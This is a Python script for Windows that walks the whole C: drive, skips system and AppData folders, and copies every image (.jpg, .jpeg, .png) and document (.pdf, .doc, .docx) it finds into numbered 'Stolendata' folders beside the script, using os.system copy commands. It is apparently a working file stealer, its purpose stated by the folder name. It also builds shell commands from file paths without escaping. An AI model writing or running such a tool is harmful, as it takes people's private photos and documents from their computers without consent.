import os


def ssubs(pathh):
	global allfolds
	global probfolds
	ppp2 = next(os.walk(pathh))[1]
	for fn in ppp2:
		ppp3 = pathh+fn+"\\"
		try:
			ssubs(ppp3)
			allfolds.append(ppp3)
		except:
			#print(f"Problem with '{pathh+fn}'")
			probfolds.append(pathh+fn)
		lf = len(allfolds)
		if not lf % 66:
			print(f"Available folders:\t{lf}", end="\r")


def getfiles(fpath):
	global allfiles
	filenames = next(os.walk(fpath), (None, None, []))[2]
	for fp in filenames:
		allfiles.append(fpath+fp)
		lf = len(allfiles)
		if not lf % 66:
			print(f"Available files:\t{lf}", end="\r")


print()
path = "C:\\"
script_path = os.path.realpath(__file__)

allfolds = []
probfolds = []
allfiles = []
picps = []
docps = []
print()
ssubs(path)
print()
for fop in allfolds:
	getfiles(fop)

exdirs = ["C:\\Windows\\", "\\All Users\\", "\\Public\\", "C:\\ProgramData\\", "C:\\Program Files", "\\AppData\\"]
try:
	print()
	file = open("excdir", "r")
	print("Excluded libraries:")
	for line in file:
		print(line)
		exdirs.append(line)
	if len(exdirs) == 6:
		print("--Standard excludes only--")
	file.close()
except FileNotFoundError:
	file = open("excdir", "w")
	print("--Standard excludes only--")
	file.close()

for filep in allfiles:
	exclib = False
	for i in exdirs:
		if i in filep:
			exclib = True
	if not exclib:
		if ".jpg" == filep[-4:] or ".jpeg" == filep[-5:] or ".png" == filep[-4:]:
			picps.append(filep)
		elif ".pdf" == filep[-4:] or ".docx" == filep[-5:] or ".doc" == filep[-4:]:
			docps.append(filep)
		ld = len(docps)
		lp = len(picps)
		if (not lp % 66) or (not lp % 66) or (ld < 250 and lp < 250):
			print(f"Pics found: {lp} \t Docs found: {ld}", end="\r")

print()
scrlib = script_path.replace(os.path.basename(__file__), '')
foldid = "0"
while os.path.isdir(scrlib + "Stolendata" + foldid):
	print(scrlib + "Stolendata" + foldid)
	foldid = str(int(foldid)+1)
print(f"Your folder id is {foldid}")
os.system("mkdir Stolendata" + foldid + " > op.txt")
os.system("mkdir Stolendata" + foldid + "\\Pics > op.txt")
os.system("mkdir Stolendata" + foldid + "\\Docs > op.txt")

print(scrlib)

doci = 0
pici = 0

for i in range(len(picps)):
	# print("copy \"" + i + "\" \"" + scrlib + "Stolendata\\Pics\\" + i.split("\\")[-1] + "\"")
	os.system("copy \"" + picps[i] + "\" \"" + scrlib + "Stolendata" + foldid + "\\Pics\\" + picps[i].split("\\")[-1] + "\" >" + scrlib + "Stolendata" + foldid + "\\op.txt")
	file = open(scrlib + "Stolendata" + foldid + "\\op.txt", "r")
	a = file.readline()
	#print(a[8])
	if a[8] == "1":
		pici += 1
	file.close()
	print(f"{pici} pics copied", end="\r")
print()
for i in range(len(docps)):
	os.system("copy \"" + docps[i] + "\" \"" + scrlib + "Stolendata" + foldid + "\\Docs\\" + docps[i].split("\\")[-1] + "\" > " + scrlib + "Stolendata" + foldid + "\\op.txt")
	file = open(scrlib + "Stolendata" + foldid + "\\op.txt", "r")
	a = file.readline()
	#print(a[8])
	if a[8] == "1":
		doci += 1
	file.close()
	print(f"{doci} docs copied", end="\r")
print()





